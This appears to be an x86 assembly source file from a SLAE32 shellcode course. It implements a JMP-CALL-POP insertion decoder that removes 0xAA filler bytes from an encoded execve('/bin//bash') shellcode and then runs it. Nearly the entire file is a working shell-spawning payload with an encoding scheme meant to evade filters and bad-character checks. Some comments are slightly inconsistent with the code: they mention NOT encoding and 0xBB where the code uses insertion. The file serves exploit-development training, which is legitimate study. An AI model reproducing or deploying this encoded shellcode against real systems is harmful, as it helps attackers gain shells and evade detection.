; EXECVE-Insert-decoder.nasm (JMP-CALL-POP)
; SLAE32
; INSERT Decoder, no NULL, using shellcode from Module 2-6 as the basis
; Then using the Python3 script "Insertion-encoder.py" to insert extra bytes in shellcode
; 
; Before NOT Encoding:  "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
; After INSERTs:        "\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x62\xaa\x61\xaa\x73\xaa\x68\xaa\x68\xaa\x62\xaa\x69\xaa\x6e\xaa\x2f\xaa\x68\xaa\x2f\xaa\x2f\xaa\x2f\xaa\x2f\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa"
; 
; int execve(const char *pathname, char *const argv[], char *const envp[]);
;   - execve does NOT need a return if successful
; EAX = syscall
; EBX = /bin/bash, 0x0
; ECX = Address of /bin/bash,0x00000000
; EDX = 0x00000000
; ESI -> /bin/bash
;

global _start

section .text
_start: 
    jmp short call_shellcode


decoder:
    pop esi             ; Get address of EncodedShellcode

    ; EDI will be used (counter) to track the random bytes to be replaced
    lea edi, [esi + 1]  ; ESI +1 is the FIRST random inserted byte
    
    xor eax, eax
    mov al, 1
    
    xor ebx, ebx


decode:
    mov bl, byte [esi + eax]        ; ESI points to the string, EAX is the array index of the next random byte
    xor bl, 0xaa                    ; Once this is a non zero value JMP.  Using the 0xBB, 0xBB to work.
    jnz short EncodedShellcode

    mov bl, byte [esi + eax + 1]    ; Grabs the real, next piece of shellcode, skipping over the random inserts

    mov byte [edi], bl              ; Move the real shellcode, next to the previous piece of real shellcod, overwriting 0xAA

    inc edi                         ; Continue iteration through shellcode
    add al, 2                       ; Since 0xAA is at every 2nd offset
    jmp short decode


call_shellcode:
    call decoder
    ; Added two 0xbb at the END of EncodedShellcode
    EncodedShellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x62,0xaa,0x61,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x2f,0xaa,0x2f,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa, 0xbb, 0xbb
